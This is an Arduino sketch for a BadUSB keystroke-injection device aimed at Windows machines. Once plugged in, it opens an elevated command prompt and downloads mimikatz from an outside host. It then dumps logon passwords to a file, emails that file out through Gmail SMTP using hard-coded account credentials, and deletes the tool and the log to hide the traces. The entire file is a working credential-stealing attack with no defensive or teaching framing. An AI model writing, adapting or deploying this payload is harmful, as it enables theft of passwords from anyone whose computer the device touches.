#include <Keyboard.h>
#include <Mouse.h>
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
void setup()
{
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  delay(1000);
Keyboard.press(KEY_LEFT_SHIFT) ;
Keyboard.press(KEY_LEFT_CTRL) ;
Keyboard.press(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://l2r1.com.br/tools/64/mimikatz.exe','%TEMP%\\pw.exe')");
  typeKey(KEY_RETURN);
  delay(5000);
  Keyboard.print("%TEMP%\\pw.exe > c:\\pwlog.txt & type pwlog.txt;");
  typeKey(KEY_RETURN);
  delay(2000);
  Keyboard.print("privilege::debug");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("sekurlsa::logonPasswords full");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("del %TEMP%\\pw.exe");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("powershell");
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.EnableSsl = $true");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('l2r1.teste@gmail.com', 'teste@l2r1');");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.From = 'l2r1.teste@gmail.com'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.To.Add('l2r1.teste@gmail.com')");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Subject = 'BadUSB Report'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Body = 'Reporte BadUSB.'");
  typeKey(KEY_RETURN);
 Keyboard.print("$ReportEmail.Attachments.Add('c:\\pwlog.txt')");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  Keyboard.print("del c:\\pwlog.txt");
  typeKey(KEY_RETURN);
  delay(700);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  Keyboard.end();
}
void loop() {}
